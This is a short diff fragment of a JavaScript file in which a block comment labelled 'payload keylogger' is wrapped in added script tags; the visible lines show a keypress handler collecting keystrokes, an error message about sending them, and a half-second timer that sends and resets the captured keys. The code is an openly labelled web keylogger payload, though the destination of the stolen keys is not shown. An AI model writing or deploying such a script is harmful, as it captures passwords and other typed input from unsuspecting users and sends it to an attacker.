@@ -8,6 +8,7 @@ refresh();
 
 // payload keylogger
 /*
+<script>
 var keys = '';
 document.onkeypress = function(e) {
 var get = window.event ? window.event : e;
@@ -34,4 +35,5 @@ console.error('Error sending keys:', error);
 keys = ''; // Reset the keys after sending
 }
 }, 500);
+</script>
 */
